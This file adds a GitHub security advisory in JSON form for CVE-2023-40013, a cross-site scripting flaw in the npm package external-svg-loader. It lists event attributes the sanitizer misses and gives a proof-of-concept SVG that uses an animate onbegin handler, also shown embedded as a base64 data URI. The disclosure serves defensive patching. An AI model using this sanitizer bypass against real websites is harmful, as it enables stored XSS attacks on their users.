@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-xc2r-jf2x-gjr8",
+  "modified": "2023-08-14T21:32:27Z",
+  "published": "2023-08-14T21:32:27Z",
+  "aliases": [
+    "CVE-2023-40013"
+  ],
+  "summary": "external-svg-loader Cross-site Scripting vulnerability",
+  "details": "### Summary\nAccording to the [docs](https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript), svg-loader will strip all JS code before injecting the SVG file for security reasons but the input sanitization logic is not sufficient and can be trivially bypassed. This allows an attacker to craft a malicious SVG which can result in XSS. \n\n### Details\nWhen trying to sanitize the svg the lib [removes event attributes](https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128) such as `onmouseover`, `onclick` but the list of events is not exhaustive. Here's a list of events not removed by svg-loader. \n`onafterscriptexecute, onbeforecopy, onbeforecut, onbeforescriptexecute, onbeforetoggle, onbegin, onbounce, onend, onfinish, onfocusin, onfocusout, onmousewheel, onpointerrawupdate, onrepeat, onsearch, onshow, onstart, ontoggle(popover), ontouchend, ontouchmove, ontouchstart`\nAs you can see in the POC we can use `onbegin` in `animate` tag to execute JS code without needing to add `data-js=\"enabled\"`.\n\n### PoC\n\n```html\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n  <animate onbegin=alert(1) attributeName=x dur=1s>\n</svg>\n\n```\n\n```html\n<html>\n    <head>\n        <script src=\"./dist/svg-loader.js\" type=\"text/javascript\"></script>\n    </head>\n    <body>\n        <svg data-src=\"data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICA8YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eCBkdXI9MXM+Cjwvc3ZnPgo=\"></svg>\n    </body>\n</html>\n\n```\n\n### Impact\nAny website which uses external-svg-loader and allows its users to provide svg src, upload svg files would be susceptible to stored XSS attack.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "external-svg-loader"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.9"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/shubhamjain/svg-loader/security/advisories/GHSA-xc2r-jf2x-gjr8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40013"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/shubhamjain/svg-loader/commit/d3562fc08497aec5f33eb82017fa1417b3319e2c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/shubhamjain/svg-loader"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-08-14T21:32:27Z",
+    "nvd_published_at": "2023-08-14T21:15:13Z"
+  }
+}
